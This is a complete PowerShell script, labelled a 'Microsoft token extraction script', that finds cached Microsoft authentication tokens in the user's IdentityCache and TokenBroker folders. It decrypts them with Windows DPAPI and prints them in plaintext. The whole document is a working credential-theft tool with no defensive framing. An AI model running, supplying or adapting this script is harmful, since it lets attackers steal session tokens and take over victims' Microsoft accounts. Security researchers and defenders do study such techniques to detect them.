# Grab tokens at either location
## C:\Users\{user}\AppData\Local\Microsoft\IdentityCache
## C:\Users\{user}\AppData\Local\Microsoft\TokenBroker

Add-Type -assembly System.Security;
echo "Microsoft token extraction script`n";

$BinFiles = Get-ChildItem -path $env:LOCALAPPDATA\Microsoft\IdentityCache -recurse -file
foreach($file in $BinFiles){
	if ( (get-command Get-Content).parameters['asbytestream'] ) {
		# PS7
		$encryptedData = (Get-Content -LiteralPath $file.versioninfo.filename -asbytestream -raw);
	} else{
		# PS5
		$encryptedData = [System.IO.File]::ReadAllBytes($file.versioninfo.filename)
	}
    $data =  [Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser);

    echo $file.versioninfo.filename;
    echo [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetString($data));
    echo "`n"
}


$TbresFiles = Get-ChildItem -path $env:LOCALAPPDATA\Microsoft\TokenBroker -recurse -file
foreach($file in $TbresFiles){
    # Import JSON object, load value in encodedData
    $rawData = (Get-Content -Encoding unicode $file.versioninfo.filename) -replace '\0' | Out-String | ConvertFrom-Json
    $encodedData = $rawData.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;

    $encryptedData = [System.Convert]::FromBase64String($encodedData);
    $data =  [Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser);

    echo $file.versioninfo.filename;
    echo [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetString($data));
    echo "`n"
}
